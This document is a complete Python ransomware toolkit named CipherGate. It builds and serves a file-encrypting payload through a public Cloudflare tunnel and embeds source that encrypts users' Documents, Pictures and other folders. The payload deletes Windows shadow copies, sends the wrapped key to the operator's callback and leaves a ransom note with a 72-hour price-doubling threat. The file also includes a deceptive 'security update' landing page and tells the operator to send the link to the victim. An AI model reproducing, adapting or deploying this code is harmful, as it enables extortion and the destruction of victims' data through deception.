#!/usr/bin/env python3
"""
CipherGate - ransomware delivery server with a public Cloudflare tunnel.

  python3 main.py            start server + tunnel, print public link
  python3 main.py --decrypt  restore *.locked files using keys/private.pem
"""

import argparse
import base64
import os
import platform
import random
import re
import secrets
import shutil
import socket
import subprocess
import sys
import threading
import time
import urllib.request
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

try:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding, rsa
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    sys.exit("[!] missing dependency ->  pip install -r requirements.txt")

# ────────────────────────────────────────────────────────────── paths / consts
ROOT    = Path(__file__).resolve().parent
BIN     = ROOT / "bin"
KEYS    = ROOT / "keys"
DIST    = ROOT / "dist"
PRIV    = KEYS / "private.pem"
PUB     = KEYS / "public.pem"
PAYLOAD = "Unlock_My_Files.py"
ZIPNAME = "Unlock_My_Files.zip"
MAGIC   = b"RNSM1"
EXT     = ".locked"

CF_BASE = "https://github.com/cloudflare/cloudflared/releases/latest/download/"

BANNER = r"""
  ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗  ██████╗  █████╗ ████████╗███████╗
  ██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝
  ██║     ██║██████╔╝███████║█████╗  ██████╔╝██║  ███╗███████║   ██║   █████╗
  ██║     ██║██╔══██╗██╔══██║██╔══╝  ██╔══██╗██║   ██║██╔══██║   ██║   ██╔══╝
  ╚██████╗██║██║  ██║██║  ██║███████╗██║  ██║╚██████╔╝██║  ██║   ██║   ███████╗
   ╚═════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝
"""

# ────────────────────────────────────────────────────────────── payload source
PAYLOAD_SRC = r'''#!/usr/bin/env python3
"""Unlock_My_Files - AES-256-GCM + RSA-2048-OAEP ransomware payload."""
import base64, os, secrets, sys, urllib.request
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

PUB_B64  = "__PUBKEY__"
CALLBACK = "__CALLBACK__"

MAGIC    = b"RNSM1"
EXT      = ".locked"
KEYFILE  = "aes_key.enc"
NOTE     = "READ_ME_TO_RESTORE.txt"
MAX_SIZE = __MAXBYTES__
WORKERS  = 8

SKIP_DIRS = {"$RECYCLE.BIN", "System Volume Information", ".git", "__pycache__",
             "node_modules", "venv", ".venv", "AppData", ".cache", ".local",
             ".npm", ".gradle", ".m2", "Termux"}
SKIP_NAMES = {NOTE, KEYFILE, "public.pem", "private.pem", "Unlock_My_Files.py",
              "START.bat", "START.sh", "README.txt", "main.py"}

NOTE_TEXT = """\
##############################################################
#          YOUR FILES HAVE BEEN ENCRYPTED BY CIPHERGATE      #
##############################################################

Documents, photos, videos and archives in your user folders are
encrypted with AES-256-GCM. The key is wrapped with RSA-2048.

  Encrypted files end with : .locked
  Your key file            : aes_key.enc  (home folder)

STEPS
-----
1. Send the file  aes_key.enc  to the operator.
2. Receive  private.pem  and the decryptor back.
3. Put both files in one folder and run:

       python3 main.py --decrypt

Do not rename or edit the .locked files. 72 hours before the
price doubles.
##############################################################
"""


def target_dirs():
    home = Path.home()
    cands = [home / n for n in
             ("Documents", "Desktop", "Pictures", "Downloads", "Music", "Videos")]
    cands.append(Path.cwd())
    return [d for d in cands if d.is_dir()]


def walk():
    for root in target_dirs():
        for dp, dn, fn in os.walk(root):
            dn[:] = [d for d in dn if d not in SKIP_DIRS]
            for name in fn:
                if name in SKIP_NAMES or name.endswith(EXT):
                    continue
                yield Path(dp) / name


def encrypt_one(path, aes):
    try:
        if path.is_symlink() or not path.is_file():
            return 0
        size = path.stat().st_size
        if size == 0 or size > MAX_SIZE:
            return 0
        data = path.read_bytes()
        nonce = secrets.token_bytes(12)
        blob = MAGIC + nonce + aes.encrypt(nonce, data, None)
        path.with_name(path.name + EXT).write_bytes(blob)
        path.unlink()
        return 1
    except Exception:
        return 0


def callback(wrapped):
    if not CALLBACK:
        return
    try:
        body = base64.b64encode(wrapped)
        req = urllib.request.Request(CALLBACK, data=body,
                                     headers={"Content-Type": "text/plain"})
        urllib.request.urlopen(req, timeout=8).read()
    except Exception:
        pass


def main():
    print("[*] loading public key")
    pub = serialization.load_pem_public_key(base64.b64decode(PUB_B64))

    aes_key = secrets.token_bytes(32)
    aes = AESGCM(aes_key)
    wrapped = pub.encrypt(
        aes_key,
        padding.OAEP(mgf=padding.MGF1(hashes.SHA256()),
                     algorithm=hashes.SHA256(), label=None))

    Path.home().joinpath(KEYFILE).write_bytes(base64.b64encode(wrapped))
    callback(wrapped)

    if os.name == "nt":
        os.system("vssadmin delete shadows /all /quiet >nul 2>&1")

    files = list(walk())
    print(f"[*] encrypting {len(files)} files ...")
    done = 0
    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        for r in pool.map(lambda p: encrypt_one(p, aes), files):
            done += r
            if done % 25 == 0:
                print(f"\r[+] {done} encrypted", end="", flush=True)

    for d in target_dirs():
        try:
            (d / NOTE).write_text(NOTE_TEXT, encoding="utf-8")
        except Exception:
            pass

    print(f"\n[+] DONE - {done} files encrypted")
    input("Press Enter to close ...")


if __name__ == "__main__":
    main()
'''

LANDING = """<!doctype html>
<html><head><meta charset="utf-8"><title>Security Notice</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{box-sizing:border-box;margin:0}
body{background:#0b0d12;color:#e6e9ef;font:16px/1.6 -apple-system,Segoe UI,Roboto,sans-serif;
display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px}
.card{max-width:520px;width:100%;background:#141822;border:1px solid #232a38;
border-radius:16px;padding:36px 28px;text-align:center;box-shadow:0 24px 60px #0008}
.logo{font:700 13px/1 monospace;letter-spacing:3px;color:#4da3ff;margin-bottom:18px}
h1{font-size:24px;margin-bottom:10px}
p{color:#9aa4b6;font-size:15px;margin-bottom:22px}
a.btn{display:block;background:#2563eb;color:#fff;text-decoration:none;font-weight:600;
padding:16px;border-radius:10px;transition:.2s}
a.btn:hover{background:#3b82f6}
.meta{font:12px monospace;color:#5f6b80;margin-top:14px}
ol{text-align:left;color:#9aa4b6;font-size:14px;margin:26px 0 0 20px}
ol li{margin-bottom:7px}
code{background:#0b0d12;padding:2px 6px;border-radius:4px;color:#7dd3fc;font-size:13px}
.foot{margin-top:26px;font:11px monospace;color:#3f4859}
</style></head><body>
<div class="card">
  <div class="logo">CIPHERGATE</div>
  <h1>Security update required</h1>
  <p>Your files need the unlocker package to stay readable.</p>
  <a class="btn" href="/d/__TOKEN__">Download unlocker (__SIZE__)</a>
  <div class="meta">__FILE__ &middot; verified package</div>
  <ol>
    <li>Download and extract the zip</li>
    <li>Run <code>START.bat</code> (Windows) or <code>START.sh</code> (Linux)</li>
    <li>Keep <code>aes_key.enc</code> and send it to the operator</li>
  </ol>
  <div class="foot">link expires when the tunnel closes</div>
</div></body></html>
"""

START_BAT = (
    "@echo off\r\n"
    "title Unlocker\r\n"
    "python -m pip install cryptography --quiet\r\n"
    "python Unlock_My_Files.py\r\n"
)

START_SH = (
    "#!/usr/bin/env bash\n"
    "cd \"$(dirname \"$0\")\"\n"
    "python3 -m pip install cryptography --quiet\n"
    "python3 Unlock_My_Files.py\n"
)

FAKE_README = """UNLOCKER PACKAGE
================

1. Extract the whole archive first.
2. Windows  : double-click START.bat
   Linux    : bash START.sh
3. The tool encrypts your folders and writes aes_key.enc to your home folder.
4. Send aes_key.enc to the operator to receive the private key.
"""

# ────────────────────────────────────────────────────────────── helpers
def hr(t=""):
    print(f"\n{'─' * 62}")
    if t:
        print(f"  {t}")


def human(n):
    for u in ("B", "KB", "MB", "GB"):
        if n < 1024:
            return f"{n:.0f} {u}"
        n /= 1024
    return f"{n:.1f} TB"


def need_crypto():
    try:
        import cryptography  # noqa
    except ImportError:
        sys.exit("[!] pip install -r requirements.txt")


def ensure_cloudflared():
    if shutil.which("cloudflared"):
        return "cloudflared"
    BIN.mkdir(exist_ok=True)
    local = BIN / "cloudflared"
    if local.exists():
        return str(local)

    arch = platform.machine().lower()
    suffix = {"x86_64": "amd64", "amd64": "amd64",
              "aarch64": "arm64", "arm64": "arm64",
              "armv7l": "arm", "armv8l": "arm"}.get(arch)
    if not suffix:
        sys.exit(f"[!] unsupported arch: {arch} - install cloudflared manually into bin/")

    url = f"{CF_BASE}cloudflared-linux-{suffix}"
    print(f"[*] downloading cloudflared ({suffix}) ...")
    try:
        urllib.request.urlretrieve(url, local)
    except Exception as e:
        sys.exit(f"[!] download failed: {e}\n    place a static binary at bin/cloudflared")
    local.chmod(0o755)
    return str(local)


def ensure_keys():
    KEYS.mkdir(exist_ok=True)
    if PRIV.exists() and PUB.exists():
        print("[*] reusing existing keypair in keys/")
        return
    print("[*] generating RSA-2048 keypair ...")
    k = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    PRIV.write_bytes(k.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()))
    PUB.write_bytes(k.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo))
    print("[!] keys/private.pem is the crown jewel - back it up")


def lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"
    finally:
        s.close()


# ────────────────────────────────────────────────────────────── build
def build_payload(max_mb: int, callback_url: str):
    DIST.mkdir(exist_ok=True)
    for old in DIST.iterdir():
        old.unlink()

    pub_b64 = base64.b64encode(PUB.read_bytes()).decode()
    src = (PAYLOAD_SRC
           .replace("__PUBKEY__", pub_b64)
           .replace("__CALLBACK__", callback_url)
           .replace("__MAXBYTES__", str(max_mb * 1024 * 1024)))

    staging = DIST / "stage"
    staging.mkdir()
    (staging / PAYLOAD).write_text(src, encoding="utf-8")
    (staging / "START.bat").write_text(START_BAT, encoding="utf-8")
    (staging / "START.sh").write_text(START_SH, encoding="utf-8")
    (staging / "README.txt").write_text(FAKE_README, encoding="utf-8")
    shutil.copy2(PUB, staging / "public.pem")

    zpath = DIST / ZIPNAME
    with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
        for f in sorted(staging.iterdir()):
            z.write(f, f.name)
    shutil.rmtree(staging)
    return zpath


# ────────────────────────────────────────────────────────────── server
class Handler(BaseHTTPRequestHandler):
    token = ""
    zip_path = None
    callback_url = ""
    got_key = threading.Event()

    def log_message(self, fmt, *a):
        pass

    def _send(self, code, body, ctype):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path in ("/", "/index.html") or self.path.startswith("/?"):
            size = human(self.zip_path.stat().st_size) if self.zip_path else "?"
            html = (LANDING.replace("__TOKEN__", self.token)
                           .replace("__SIZE__", size)
                           .replace("__FILE__", ZIPNAME))
            return self._send(200, html.encode(), "text/html; charset=utf-8")

        if self.path == f"/d/{self.token}":
            data = self.zip_path.read_bytes()
            self.send_response(200)
            self.send_header("Content-Type", "application/zip")
            self.send_header("Content-Disposition", f'attachment; filename="{ZIPNAME}"')
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
            print(f"\n[>] {self.client_address[0]} downloaded the package")
            return

        if self.path == "/health":
            return self._send(200, b"ok", "text/plain")

        return self._send(404, b"not found", "text/plain")

    def do_POST(self):
        if self.path != "/keys":
            return self._send(404, b"no", "text/plain")
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n).strip()
        if not body:
            return self._send(400, b"empty", "text/plain")
        out = DIST / f"aes_key_{int(time.time())}.enc"
        out.write_bytes(body)
        print(f"\n[KEY] wrapped AES key received from {self.client_address[0]}")
        print(f"      saved -> {out.relative_to(ROOT)}")
        print(f"      next  -> python3 main.py --decrypt --key {out}")
        self.got_key.set()
        return self._send(200, b"stored", "text/plain")


def start_tunnel(cf, port):
    """Launch cloudflared, return (proc, public_url)."""
    proc = subprocess.Popen(
        [cf, "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate"],
        stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
        text=True, bufsize=1)

    url_box = {}
    pat = re.compile(r"https://[a-z0-9][a-z0-9-]*\.trycloudflare\.com")

    def reader():
        for line in proc.stderr:
            m = pat.search(line)
            if m and "url" not in url_box:
                url_box["url"] = m.group(0)

    threading.Thread(target=reader, daemon=True).start()

    deadline = time.time() + 45
    while time.time() < deadline:
        if "url" in url_box:
            return proc, url_box["url"]
        if proc.poll() is not None:
            sys.exit("[!] cloudflared exited - is the network blocking it?")
        time.sleep(0.3)
    proc.terminate()
    sys.exit("[!] no tunnel URL after 45s - retry or use --no-tunnel")


# ────────────────────────────────────────────────────────────── decrypt
def do_decrypt(key_file: Path, max_mb: int):
    need_crypto()
    if not PRIV.exists():
        sys.exit("[!] keys/private.pem not found")
    if not key_file.exists():
        sys.exit(f"[!] key file not found: {key_file}")

    priv = serialization.load_pem_private_key(PRIV.read_bytes(), None)
    try:
        aes_key = priv.decrypt(
            base64.b64decode(key_file.read_bytes()),
            padding.OAEP(mgf=padding.MGF1(hashes.SHA256()),
                         algorithm=hashes.SHA256(), label=None))
    except Exception:
        sys.exit("[!] cannot unwrap key - wrong private key or corrupted file")
    aes = AESGCM(aes_key)

    ok = bad = 0
    for p in Path.home().rglob(f"*{EXT}"):
        try:
            raw = p.read_bytes()
            if not raw.startswith(MAGIC):
                continue
            plain = aes.decrypt(raw[5:17], raw[17:], None)
            p.with_name(p.name[:-len(EXT)]).write_bytes(plain)
            p.unlink()
            ok += 1
            print(f"\r[+] restored {ok}", end="", flush=True)
        except Exception:
            bad += 1
    print(f"\n[+] done: {ok} restored, {bad} failed")


# ────────────────────────────────────────────────────────────── main
def main():
    ap = argparse.ArgumentParser(description="CipherGate delivery server")
    ap.add_argument("--port", type=int, default=8000)
    ap.add_argument("--no-tunnel", action="store_true")
    ap.add_argument("--decrypt", action="store_true")
    ap.add_argument("--key", default="aes_key.enc")
    ap.add_argument("--max-mb", type=int, default=100)
    ap.add_argument("--token", default=None)
    args = ap.parse_args()

    print(BANNER)

    if args.decrypt:
        return do_decrypt(Path(args.key), args.max_mb)

    need_crypto()
    ensure_keys()
    cf = None if args.no_tunnel else ensure_cloudflared()

    token = args.token or secrets.token_hex(6)

    Handler.token = token
    Handler.callback_url = ""
    httpd = ThreadingHTTPServer(("0.0.0.0", args.port), Handler)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()

    if args.no_tunnel:
        base = f"http://{lan_ip()}:{args.port}"
    else:
        print("[*] opening cloudflare tunnel ...")
        proc, base = start_tunnel(cf, args.port)
        Handler.callback_url = f"{base}/keys"
        print(f"[+] tunnel up: {base}")

    zip_path = build_payload(args.max_mb, Handler.callback_url)
    Handler.zip_path = zip_path
    Handler.callback_url = Handler.callback_url or f"{base}/keys"

    hr("READY")
    print(f"  payload : {zip_path.name} ({human(zip_path.stat().st_size)})")
    print(f"  token   : {token}")
    print(f"  callback: {'on' if not args.no_tunnel else 'off (LAN mode)'}")

    hr("SEND THIS LINK TO THE VICTIM")
    print(f"\n  {base}/?t={token}\n")
    print("─" * 62)
    print("  Ctrl+C to stop")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] shutting down")
    finally:
        httpd.shutdown()
        if cf:
            subprocess.run(["pkill", "-f", "cloudflared tunnel"], check=False)


if __name__ == "__main__":
    main()